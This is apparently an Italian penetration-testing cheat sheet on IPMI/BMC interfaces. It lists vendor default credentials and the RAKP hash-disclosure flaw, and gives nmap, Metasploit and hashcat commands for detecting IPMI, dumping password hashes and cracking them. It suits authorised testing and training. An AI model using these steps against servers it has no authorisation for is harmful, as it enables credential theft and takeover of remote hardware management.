# IPMI — Intelligent Platform Management Interface
**Porte:** 623 (UDP)  
**Categoria:** Hardware & Management

Interfaccia per gestire server da remoto, ANCHE SE SPENTI (basta che siano attaccati alla corrente).
Indipendente da CPU, BIOS e sistema operativo — funziona tramite il BMC (Baseboard Management Controller).

Nomi commerciali: HP = iLO, Dell = iDRAC, Supermicro = IPMI.

Permette: accensione/spegnimento remoto, modifica BIOS, monitoraggio hardware (temp, ventole),
reinstallazione OS da remoto come se inserissi una chiavetta USB fisicamente.

## Vulnerabilità comuni

- Password di default — Dell: root/calvin, Supermicro: ADMIN/ADMIN, HP iLO: bollino dietro il server
- Difetto protocollo RAKP (vers. 2.0) — il server invia l'hash della password PRIMA dell'autenticazione!
- Hash crackabili con hashcat -m 7300 (difetto di progettazione, non riparabile con aggiornamento)
- Interfaccia web spesso esposta su Internet senza restrizioni
- Firmware raramente aggiornato — vecchie CVE persistenti

## Enumerazione & Comandi

### RILEVAMENTO

```bash
sudo nmap -sU --script ipmi-version -p 623 <IP>      # Rileva versione IPMI
```

### METASPLOIT — versione IPMI

```bash
msfconsole > use auxiliary/scanner/ipmi/ipmi_version > set RHOSTS <IP> > run
```

### METASPLOIT — dump hash (sfrutta difetto RAKP)

```bash
msfconsole > use auxiliary/scanner/ipmi/ipmi_dumphashes > set RHOSTS <IP> > run
```

### CRACK HASH CON HASHCAT

```bash
hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u  # Brute force con mask
hashcat -a 0 -m 7300 ipmi.txt /usr/share/wordlists/rockyou.txt  # Con wordlist
```

## Tool consigliati

*Installa con `use <tool>` + `install`*

- **nmap**
- **hashcat**
